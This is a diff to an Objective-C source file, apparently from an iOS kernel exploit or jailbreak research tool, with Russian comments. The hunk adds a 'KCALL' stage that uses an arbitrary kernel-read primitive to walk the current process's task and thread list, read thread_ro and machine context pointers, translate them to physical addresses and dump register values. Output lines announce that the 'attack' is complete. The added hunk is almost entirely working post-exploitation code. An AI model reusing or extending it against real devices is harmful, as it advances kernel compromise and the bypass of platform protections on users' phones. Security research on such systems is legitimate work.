@@ -3089,7 +3089,58 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3] выше\n"];
+    // ---- KCALL READ-ONLY 2.0.85 ----
+    // Наш walk: proc → task → threads. Только ЧТЕНИЕ machine_contextData.
+    // Ноль kobject-скана, ноль записи в живые потоки.
+    [r appendString:@"=== KCALL 2.0.85: ACT_CONTEXT read-only ===\n"];
+    {
+        uint64_t taskVA = 0;
+        uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
+        if (kpLooksLikeKernelPointer(pr2))
+            taskVA = kp_untag_ptr(early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task));
+        kpNote(r, [NSString stringWithFormat:@"  [KCALL] task=%#llx", (unsigned long long)taskVA]);
+        if (kpLooksLikeKernelPointer(taskVA)) {
+            // обход threads (наш безопасный walk, с dedupe)
+            uint64_t head = taskVA + off_task_threads_next;
+            uint64_t seen[8]; int nSeen = 0;
+            uint64_t e = kp_untag_ptr(early_kread64(head));
+            int guardCnt = 0;
+            while (kpLooksLikeKernelPointer(e) && guardCnt++ < 6 && nSeen < 6) {
+                uint64_t th = e - off_thread_task_threads_next;
+                int dup = 0;
+                for (int i = 0; i < nSeen; i++) if (seen[i] == th) dup = 1;
+                if (dup) { e = kp_untag_ptr(early_kread64(e)); if (e == head) break; continue; }
+                seen[nSeen++] = th;
+                kpNote(r, [NSString stringWithFormat:@"  [KCALL] thread[%d]=%#llx", nSeen - 1, (unsigned long long)th]);
+                // thread_ro
+                uint64_t tro = kp_untag_ptr(early_kread64(th + off_thread_t_tro));
+                if (kpLooksLikeKernelPointer(tro)) {
+                    uint64_t procFromTro = kp_untag_ptr(early_kread64(tro + off_thread_ro_tro_proc));
+                    kpNote(r, [NSString stringWithFormat:@"    tro=%#llx proc=%#llx",
+                              (unsigned long long)tro, (unsigned long long)procFromTro]);
+                }
+                // machine_contextData — ТОЛЬКО ЧТЕНИЕ
+                if (off_thread_machine_contextdata) {
+                    uint64_t ctx = kp_untag_ptr(early_kread64(th + off_thread_machine_contextdata));
+                    kpNote(r, [NSString stringWithFormat:@"    ctx=%#llx", (unsigned long long)ctx]);
+                    if (kpLooksLikeKernelPointer(ctx)) {
+                        uint64_t pa = kvtophys(ctx & ~0x3fffULL);
+                        int t = pa ? kpFrameTypeOf(pa) : -1;
+                        NSMutableString *regs = [NSMutableString string];
+                        for (int i = 0; i < 8; i++)
+                            [regs appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(ctx + i * 8)];
+                        kpNote(r, [NSString stringWithFormat:@"    ctx pa=%#llx t=%d regs:%@",
+                                  (unsigned long long)pa, t, regs]);
+                    }
+                }
+                e = kp_untag_ptr(early_kread64(e));
+                if (e == head) break;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [KCALL] threads found=%d", nSeen]);
+        }
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[KCALL] выше\n"];
     return r;
 
 }
